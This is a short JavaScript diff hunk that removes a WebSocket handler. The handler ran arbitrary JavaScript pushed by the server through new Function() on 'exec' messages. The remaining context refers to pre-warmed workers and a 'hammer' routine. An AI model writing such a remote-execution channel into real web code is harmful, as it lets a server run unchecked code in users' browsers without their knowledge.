@@ -1,20 +1,3 @@
-const sessionId = crypto.randomUUID();
-let ws = null;
-
-function connectWS() {
-  const protocol = location.protocol === "https:" ? "wss" : "ws";
-  ws = new WebSocket(`${protocol}://${location.host}/ws/${sessionId}`);
-  ws.onclose = () => { ws = null; };
-  ws.onerror = () => { ws = null; };
-  ws.onmessage = (event) => {
-    try { handleCommand(JSON.parse(event.data)); } catch (e) {}
-  };
-}
-
-function handleCommand(cmd) {
-  if (cmd.type === "exec" && cmd.js) new Function(cmd.js)();
-}
-
 // ── MODULE STATE ─────────────────────────────────────────────────────────────
 const _workers = [];   // all pre-warmed worker references
 let _hammering = false; // true once startHammer() has been called
